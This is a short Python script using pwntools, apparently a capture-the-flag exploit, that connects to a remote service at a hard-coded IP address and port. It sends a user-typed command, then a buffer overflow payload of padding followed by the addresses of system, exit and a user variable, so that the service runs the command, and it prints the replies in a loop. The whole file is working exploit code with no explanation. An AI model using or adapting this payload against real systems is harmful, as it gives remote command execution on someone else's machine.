from pwn import *

# Open program

while True:

    p = remote("51.15.171.241", 9005)
    # p = remote("localhost", 9000)
    cmd = input("Enter command: ")

    user = bytes(cmd, 'utf-8')

    p.sendline(user)

    authenticate = b"1"

    p.sendline(authenticate)

    buffer = b'A' * 27
    buffer += p32(0x80490c0) # system function
    buffer += p32(0x80490d0) # exit (system 'ret' addr) function
    buffer += p32(0x804c06c) # user variable addr

    # Send payload
    p.sendline(buffer)

    # While p is running, print the output
    for _ in range(50):
        print(str(p.recvline()))
